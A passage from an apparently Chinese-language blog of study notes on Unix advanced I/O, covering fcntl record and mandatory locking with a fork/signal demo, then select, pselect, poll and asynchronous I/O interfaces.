class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>FILE_MODE(S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGHUP 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGINT 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGQUIT 3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGILL 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGTRAP 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGABRT 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGIOT 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGBUS 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGFPE 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGKILL 9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGUSR110</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGSEGV11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGUSR212</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGPIPE13</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGALRM14</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGTERM15</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGSTKFLT16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGCHLD17</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGCONT18</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGSTOP19</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGTSTP20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGTTIN21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGTTOU22</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGURG23</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGXCPU24</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGXFSZ25</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGVTALRM26</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGPROF27</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGWINCH28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGIO29</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> read_lock(fd, offset, whence, len) \</span><br><span class="hljs-meta">lock_reg((fd), F_SETLK, F_RDLCK, (offset), (whence), (len))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> readw_lock(fd, offset, whence, len) \</span><br><span class="hljs-meta">lock_reg((fd), F_SETLKW, F_RDLCK, (offset), (whence), (len))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> write_lock(fd, offset, whence, len) \</span><br><span class="hljs-meta">lock_reg((fd), F_SETLK, F_WRLCK, (offset), (whence), (len))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writew_lock(fd, offset, whence, len) \</span><br><span class="hljs-meta">lock_reg((fd), F_SETLKW, F_WRLCK, (offset), (whence), (len))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> un_lock(fd, offset, whence, len) \</span><br><span class="hljs-meta">lock_reg((fd), F_SETLK, F_UNLCK, (offset), (whence), (len))</span><br><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">lock_reg</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> cmd, <span class="hljs-type">int</span> type, <span class="hljs-type">off_t</span> offset, <span class="hljs-type">int</span> whence, <span class="hljs-type">off_t</span> len)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flock</span> <span class="hljs-title">lock</span>;</span><br><br>    lock.l_type = type;<br>    lock.l_start = offset;<br>    lock.l_whence = whence;<br>    lock.l_len = len;<br><br>    <span class="hljs-keyword">return</span>(fcntl(fd, cmd, &amp;lock));<br>&#125;<br><br><br><br><br><span class="hljs-type">static</span> <span class="hljs-type">sigset_t</span> newmask, oldmask, zeromask;<br><span class="hljs-type">static</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">sig_atomic_t</span> sigflag;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sig_usr</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><span class="hljs-comment">/* one signal handler for SIGUSR1 and SIGUSR2 */</span><br>&#123;<br>sigflag = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">TELL_WAIT</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">if</span> (signal(SIGUSR1, sig_usr) == SIG_ERR)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;signal(SIGUSR1) error&quot;</span>);<br><span class="hljs-keyword">if</span> (signal(SIGUSR2, sig_usr) == SIG_ERR)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;signal(SIGUSR2) error&quot;</span>);<br>sigemptyset(&amp;zeromask);<br>sigemptyset(&amp;newmask);<br>sigaddset(&amp;newmask, SIGUSR1);<br>sigaddset(&amp;newmask, SIGUSR2);<br><br><span class="hljs-comment">/* Block SIGUSR1 and SIGUSR2, and save current signal mask */</span><br><span class="hljs-keyword">if</span> (sigprocmask(SIG_BLOCK, &amp;newmask, &amp;oldmask) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//阻塞SIGUSR1和SIGUSR2</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIG_BLOCK error&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">TELL_PARENT</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span><br>&#123;<br>kill(pid, SIGUSR2);<span class="hljs-comment">/* tell parent we&#x27;re done */</span><br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">WAIT_PARENT</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">while</span> (sigflag == <span class="hljs-number">0</span>)<br>sigsuspend(&amp;zeromask);<span class="hljs-comment">/* and wait for parent */</span> <span class="hljs-comment">//清空阻塞，接收信号</span><br>sigflag = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* Reset signal mask to original value */</span><br><span class="hljs-keyword">if</span> (sigprocmask(SIG_SETMASK, &amp;oldmask, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIG_SETMASK error&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">TELL_CHILD</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span><br>&#123;<br>kill(pid, SIGUSR1);<span class="hljs-comment">/* tell child we&#x27;re done */</span><br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">WAIT_CHILD</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">while</span> (sigflag == <span class="hljs-number">0</span>)<br>sigsuspend(&amp;zeromask);<span class="hljs-comment">/* and wait for child */</span><br>sigflag = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* Reset signal mask to original value */</span><br><span class="hljs-keyword">if</span> (sigprocmask(SIG_SETMASK, &amp;oldmask, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIG_SETMASK error&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_fl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> flags)</span> <span class="hljs-comment">/* flags are file status flags to turn on */</span><br>&#123;<br>    <span class="hljs-type">int</span>        val;<br><br>    <span class="hljs-keyword">if</span> ( (val = fcntl(fd, F_GETFL, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fcntl F_GETFL error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br><br>    val |= flags;        <span class="hljs-comment">/* turn on flags */</span><br><br>    <span class="hljs-keyword">if</span> (fcntl(fd, F_SETFL, val) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fcntl F_SETFL error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">5</span>];    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">statbuf</span>;</span><br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s filename\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((fd = open(argv[<span class="hljs-number">1</span>], O_RDWR | O_CREAT | O_TRUNC, FILE_MODE)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;open error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (write(fd, <span class="hljs-string">&quot;abcdef&quot;</span>, <span class="hljs-number">6</span>) != <span class="hljs-number">6</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fstat(fd, &amp;statbuf) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fstat error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-comment">//强制锁定</span><br>    <span class="hljs-keyword">if</span> (fchmod(fd, (statbuf.st_mode &amp; ~S_IXGRP) | S_ISGID) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//删除组执行，将进程的有效组ID设置为文件的组所有者ID</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fchmod error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    TELL_WAIT();<br><br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//父进程</span><br>        <span class="hljs-keyword">if</span> (write_lock(fd, <span class="hljs-number">0</span>, SEEK_SET, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//添加写锁</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write_lock error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        TELL_CHILD(pid);<span class="hljs-comment">//唤醒子进程</span><br><br>        <span class="hljs-keyword">if</span>(waitpid(pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//等待子进程发送信号</span><br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;waitpid error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        WAIT_PARENT();<span class="hljs-comment">//判断父进程是否有发送下信号</span><br>        set_fl(fd, O_NONBLOCK); <span class="hljs-comment">//将文件修改为不阻塞</span><br>        <span class="hljs-keyword">if</span> (read_lock(fd, <span class="hljs-number">0</span>, SEEK_SET, <span class="hljs-number">0</span>) != <span class="hljs-number">-1</span>) <span class="hljs-comment">//增加读锁</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;child: read_lock succeeded&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read_lock of already-locked region returns %d\n&quot;</span>,errno);<br><br>        <span class="hljs-keyword">if</span> (lseek(fd, <span class="hljs-number">0</span>, SEEK_SET) == <span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;lseek error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (read(fd, buf, <span class="hljs-number">2</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read failed (mandatory locking works)&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read OK (o mandatory locking), buf = %2.2s\n&quot;</span>,buf);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO多路复用"><a href="#IO多路复用" class="headerlink" title="IO多路复用"></a>IO多路复用</h2><p>从一个文件描述符中读取数据，并写入到另一个文件描述符中,通过阻塞<code>I/O</code>实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((n = read(STDIN_FILENO, buf, BUFSIZE)) &gt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> (write(STDOUT_FILENO, buf, n) != n)<br>        err_sys(<span class="hljs-string">&quot;write error&quot;</span>);<br></code></pre></td></tr></table></figure><p>上述实现方法不能应用于从两个文件描述符当中读取数据，因为我们没有办法同时阻塞两个<code>read</code></p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230202223826795.png" alt="image-20230202223826795"></p><p>使用两个不同进程分别进行读与写能够解决上述情况，但是当父子进程被终止时需要相互使用信号进行通知，会增加程序的复杂性</p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230202224110468.png" alt="image-20230202224110468"></p><p>使用同个进程两个不同线程进行处理，但是需要同步两个线程之间的信息。</p><ul><li>轮询：读取文件描述符，若无数据直接返回，等一段时间再进行读取<ul><li>缺点：浪费CPU时间</li><li>应该避免在多任务系统上进行使用</li></ul></li><li>同步<code>I/O</code>：当从文件描述符通过<code>I/O</code>读取时，内核需要通知用户<ul><li>缺点：兼容性不高、单一的信号无法标记所有的文件描述符</li></ul></li><li><code>I/O</code>复用：通过构建描述符列表，并调用一个函数，直到其中一个描述符准备好<code>I/O</code>时才返回</li></ul><h3 id="select-和-pselect函数"><a href="#select-和-pselect函数" class="headerlink" title="select 和 pselect函数"></a>select 和 pselect函数</h3><p><code>select</code>函数实现<code>I/O</code>复用，参数指明</p><ul><li>哪个文件描述符我们感兴趣</li><li>文件描述符的哪个状态我们感兴趣</li><li>我们需要等待多长时间</li></ul><p><code>return</code></p><ul><li>总共有多少个文件描述符已就绪</li><li>三个条件（读、写和异常）中的每一个都准备好了哪些描述符</li></ul><p>总的来说，<code>select</code>函数用于获取我们对某个文件描述符感兴趣的状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">select</span><span class="hljs-params">(<span class="hljs-type">int</span> maxfdp1, <span class="hljs-comment">//最大的文件描述符的个数加一，可以设置为FD_SETSIZE，在&lt;sys/select.h&gt;头文件中</span></span><br><span class="hljs-params">           fd_set *<span class="hljs-keyword">restrict</span> readfds, <span class="hljs-comment">//感兴趣的读文件描述符</span></span><br><span class="hljs-params">          fd_set *<span class="hljs-keyword">restrict</span> writefds, <span class="hljs-comment">//感兴趣的写文件描述符</span></span><br><span class="hljs-params">           fd_set *<span class="hljs-keyword">restrict</span> exceptfds, <span class="hljs-comment">//感兴趣的异常的描述符</span></span><br><span class="hljs-params">          <span class="hljs-keyword">struct</span> timeval *restricct tvptr)</span>;<br><br><span class="hljs-comment">//Returns:count of ready deescriptors, 0 on timeout, -1 on error</span><br></code></pre></td></tr></table></figure><ul><li><code>tvptr == NULL</code><ul><li>无限制的等待。当描述符就绪以及被信号中断则返回。若被信号中断则<code>select</code>返回<code>-1</code>以及<code>errno</code>被设置为<code>EINTR</code></li></ul></li><li><code>tvptr-&gt;tv_sec == 0 &amp;&amp; tvptr-&gt;tv_usec == 0</code><ul><li>不等待。测试所有指定的描述符，并立即返回。</li></ul></li><li><code>tvptr-&gt;tv_sec != 0 || tvptr-&gt;tv_usec != 0</code><ul><li>等待指定秒数或毫秒数。当指定的描述符之一就绪或超时返回。</li></ul></li></ul><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230202232500872.png" alt="image-20230202232500872"></p><p><strong>fd_set数据类型的操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">FD_ISSET</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, fd_set *fdset)</span>;<br>Returns:nonzero <span class="hljs-keyword">if</span> fd is in <span class="hljs-built_in">set</span>,<span class="hljs-number">0</span> otherwise<br><span class="hljs-type">void</span> <span class="hljs-title function_">FD_CLR</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, fd_set *fdset)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">FD_SET</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, fd_set *fdset)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">FD_ZERO</span><span class="hljs-params">(fd_set *fd_set)</span>;<br></code></pre></td></tr></table></figure><p><strong>example1</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">fd_set rset;<br><span class="hljs-type">int</span> fd;<br><br>FD_ZERO(&amp;rset);<br>FD_SET(fd, &amp;rset);<br>FD_SET(STDIN_FILENO, &amp;rset);<br><br><span class="hljs-keyword">if</span> (FD_ISSET(fd, &amp;rset))&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>example2</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">fd_set readset, writeset;<br><br>FD_ZERO(&amp;readset);<br>FD_ZERO(&amp;writeset);<br>FD_SET(<span class="hljs-number">0</span>, &amp;readset);<br>FD_SET(<span class="hljs-number">3</span>, &amp;readset);<br>FD_SET(<span class="hljs-number">1</span>, &amp;writeset);<br>FD_SET(<span class="hljs-number">2</span>, &amp;WRITESET);<br>select(<span class="hljs-number">4</span>, &amp;readset, &amp;writeset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>返回值可能的情况</p><ul><li>返回值为-1意味着错误发生。例如被信号中断</li><li>返回值为0，意味着等待超时，此时所有的描述符集会被清空</li><li>非负数，意味着对应的描述符已经就绪。该值是三个集合中所有描述符的总和。</li></ul><p><strong>pselect</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pselect</span><span class="hljs-params">(<span class="hljs-type">int</span> maxfdp1, </span><br><span class="hljs-params">            fd_set *<span class="hljs-keyword">restrict</span> readfds,</span><br><span class="hljs-params">            fd_set *<span class="hljs-keyword">restrict</span> writefds,</span><br><span class="hljs-params">            fd_set *<span class="hljs-keyword">restrict</span> exceptfds,</span><br><span class="hljs-params">            <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *<span class="hljs-keyword">restrict</span> tsptr,</span><br><span class="hljs-params">            <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-keyword">restrict</span> sigmask)</span>;<br>Returns:count of ready descriptors, <span class="hljs-number">0</span> on timeout, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p><strong>与select区别</strong></p><ul><li>时间采用<code>timespec</code>结构体，提供了秒与纳米级别的粒度</li><li>提供了信号集，可以指定安装对应的信号掩码</li></ul><h3 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">poll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd fdarray[], <span class="hljs-type">nfds_t</span> nfds, <span class="hljs-type">int</span> timeout)</span>;<br>Returns:count of ready descriptors, <span class="hljs-number">0</span> on timeout, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> &#123;</span><br><span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">short</span> events;<br>    <span class="hljs-type">short</span> revents;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230203200512981.png" alt="image-20230203200512981"></p><ul><li><code>timeout == -1</code><ul><li>一直等待。如果捕获到信号，轮询将返回-1，errno设置为EINTR</li></ul></li><li><code>timeout == 0</code><ul><li>不等待。所有描述符都将被测试并且立即返回。这是一种<code>poll</code>找出多个描述符状态的方法，而不会阻塞轮询调用。</li></ul></li><li><code>timeout &gt; 0</code><ul><li>等到指定的毫秒数。当指定描述符就绪或者超时则返回。超时时返回0。</li></ul></li></ul><h2 id="异步I-x2F-O"><a href="#异步I-x2F-O" class="headerlink" title="异步I&#x2F;O"></a>异步I&#x2F;O</h2><p>异步操作可能产生的错误</p><ul><li>操作提交相关</li><li>操作本身</li><li>确定异步状态的函数</li></ul><h3 id="System-V-异步I-x2F-O"><a href="#System-V-异步I-x2F-O" class="headerlink" title="System V 异步I&#x2F;O"></a>System V 异步I&#x2F;O</h3><p>在流设备与流管道上工作。</p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230203205833011.png" alt="image-20230203205833011"></p><h3 id="BSD异步I-x2F-O"><a href="#BSD异步I-x2F-O" class="headerlink" title="BSD异步I&#x2F;O"></a>BSD异步I&#x2F;O</h3><p><code>BSD</code>驱动系统需要结合两个信号</p><ul><li><code>SIGIO</code>：通常为异步信号</li><li><code>SIGURG</code>：用于通知进程带外数据已到达网络连接</li></ul><p>为了接收<code>SIGIO</code>信号，需要执行三个步骤</p><ol><li>建立基于<code>SIGIO</code>的信号处理函数</li><li>设置进程ID或进程组ID为了接收 信号的描述符通过函数<code>fcntl</code>并设置参数<code>F_SETOWN</code></li><li>通过<code>fcntl</code>设置<code>O_ASYNC</code>文件状态标志，启用描述符上的异步<code>I/O</code></li></ol><h3 id="POSIX异步I-x2F-O"><a href="#POSIX异步I-x2F-O" class="headerlink" title="POSIX异步I&#x2F;O"></a>POSIX异步I&#x2F;O</h3><p><code>POSIX</code>的异步<code>I/O</code>接口使用<code>AIO</code>块去描述<code>I/O</code>操作</p><p><code>AIO</code>块通过<code>aiocb</code>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 